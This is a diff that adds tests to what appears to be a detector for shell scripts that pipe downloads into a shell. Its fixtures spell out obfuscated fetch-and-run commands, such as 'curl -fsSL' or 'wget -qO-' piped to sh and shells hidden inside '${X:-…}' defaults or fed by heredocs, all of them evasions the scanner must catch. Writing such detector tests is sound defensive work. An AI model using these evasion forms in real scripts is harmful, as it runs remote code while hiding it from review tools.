@@ -744,6 +744,42 @@ class TestAnAnsiCWordInsideTheDefaultIsBashsText(unittest.TestCase):
                 self.assertTrue(reported(row + "\necho done\n", shell))
 
 
+class TestAWholeDefaultNamingAKnownCommandIsThatCommand(unittest.TestCase):
+    """PR #2856 round 10, the round-9 verdict's B1: a command word read whole whose default's first
+    word is a name the command layer reads -- a wrapper, a fetcher, a foreign interpreter, by path
+    too -- is that command, as `main` read it by its basename: `${X:-/usr/bin/env sh -c} '…'` runs
+    the shell, and `${X:-/usr/bin/curl -fsSL} URL | sh` pipes a download into it. Round 9 read the
+    whole word as a name it does not follow, CLEAN (721 cells, 145 rows of the seat's hunts 18, 20
+    and 22 that `main` and the base report, every shell running the payload). Only those names:
+    any other first word keeps the whole word, which the step's own values may resolve (CSV1,
+    `RUN='sh tool'` then `${RUN:-cat x}`), and so do a pattern and a substitution (GL1H, CSH17),
+    which a reading of every first word read CLEAN (the seat's 95 cells, 19 rows)."""
+
+    REPORT = ("${X:-/usr/bin/env sh -c} '%s'" % PIPE,                            # WPeC
+              "${X:-/usr/bin/nohup bash -c} '%s'" % PIPE,                        # WPhB
+              "f() {\n  ${X:-/usr/bin/env sh -c} '%s'\n}\nf" % PIPE,             # OPeF
+              "${X:-/usr/bin/env curl -fsSL} %si.sh | sh" % URL,                 # WF01
+              "${X:-/usr/bin/env -u FOO sh -c} '%s'" % PIPE,                     # WC12
+              "${X:-/usr/bin/curl -fsSL} %si.sh | sh" % URL,                     # FPa1
+              "${X:-/usr/bin/curl -fsSLo tool} %stool\nsh tool" % URL,           # FPa2
+              "${X:-/usr/bin/wget -qO-} %si.sh | sh" % URL)                      # FPd1
+    KEPT = (GET + "RUN='sh tool'\n${RUN:-cat x}",                                # CSV1
+            "${X:-/bin/[s]h -s} <<'EOF'\n%s\nEOF" % PIPE,                       # GL1H
+            "${X:-$(echo bash) -s} <<'EOF'\n%s\nEOF" % PIPE)                    # CSH17
+
+    def test_a_default_naming_a_wrapper_or_fetcher_runs_it(self):
+        for row in self.REPORT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+    def test_any_other_first_word_keeps_the_whole_word(self):
+        for row in self.KEPT:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(row + "\necho done\n", shell))
+
+
 class TestTheClosedRowsTheSeatAskedPinned(unittest.TestCase):
     """The #2856 seat's round-1 note 2: a comment line between `|` and `sh`, `${X:-sh -c}`
     inside `eval`, a `-c` string and a heredoc, `sh <> tool`, and the two-line check gate,
